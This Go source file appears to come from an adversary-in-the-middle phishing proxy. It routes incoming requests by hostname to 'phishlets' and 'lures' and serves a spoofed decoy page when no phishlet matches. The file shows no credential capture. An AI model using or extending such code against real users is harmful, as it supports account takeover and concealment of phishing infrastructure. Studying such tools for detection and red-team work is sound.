package request

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type phishletResolver interface {
	ResolveHostname(hostname, urlPath string) (*aitm.Phishlet, *aitm.Lure, error)
}

type PhishletRouter struct {
	Resolver phishletResolver
	Spoof    spoofer
}

func (h *PhishletRouter) Name() string { return "PhishletRouter" }

func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	hostname := hostWithoutPort(strings.ToLower(req.Host))

	phishlet, lure, err := h.Resolver.ResolveHostname(hostname, req.URL.Path)
	if err != nil {
		return fmt.Errorf("phishlet_router: resolving %q: %w", hostname, err)
	}
	if phishlet == nil {
		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
		return proxy.ErrShortCircuit
	}

	ctx.Phishlet = phishlet
	ctx.Lure = lure

	return nil
}

var _ proxy.RequestHandler = (*PhishletRouter)(nil)
